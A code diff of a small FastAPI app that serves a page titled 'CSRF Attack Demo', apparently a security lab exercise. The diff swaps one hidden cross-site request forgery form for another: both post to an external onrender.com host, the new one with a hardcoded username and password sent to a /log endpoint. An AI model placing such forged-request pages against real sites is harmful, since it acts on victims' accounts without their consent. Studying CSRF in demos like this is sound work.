@@ -2,7 +2,6 @@ from fastapi import FastAPI
 from fastapi.responses import HTMLResponse
 from fastapi.responses import FileResponse
 
-
 app = FastAPI()
 
 @app.get("/favicon.ico", include_in_schema=False)
@@ -21,13 +20,11 @@ async def read_root():
     </head>
     <body>
         <h1>CSRF Attack Demo</h1>
-        <form action="https://sktst-rental.onrender.com/account" method="POST">
-            <input type="hidden" name="Username" value="attacker">
-            <input type="hidden" name="Email" value="attacker@example.com">
-            <input type="submit" value="Submit">
+        <form action="https://sktst-rental.onrender.com/log" method="POST">
+            <input type="hidden" name="username" value="Orkennnnnnn">
+            <input type="hidden" name="password" value="12qwaszx">
+            <input type="submit" value="login">
         </form>
     </body>
     </html>
     """
-
-# Убедитесь, что вы указываете правильный порт, если требуется
